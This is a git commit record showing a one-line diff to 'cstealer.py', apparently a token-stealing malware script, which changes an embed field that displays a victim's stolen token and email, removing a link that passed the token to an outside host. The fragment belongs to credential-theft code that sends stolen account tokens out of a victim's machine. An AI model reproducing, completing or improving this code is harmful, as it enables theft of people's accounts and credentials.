ac40e5713b122f829c6caa25168b83ed67aec3b5
cankat <43050583+can-kat@users.noreply.github.com>
2024-06-25 00:11:42 +0300

    Update cstealer.py
    Removed non-working function

--- cstealer.py
+++ cstealer.py
@@ -461,7 +461,7 @@ def UP104D70K3N(token, path):
             "fields": [
                 {
                     "name": "<:hackerblack:1095747410539593800> Token:",
-                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
+                    "value": f"`{token}`"
                 },
                 {
                     "name": "<:mail:1095741024678191114> Email:",
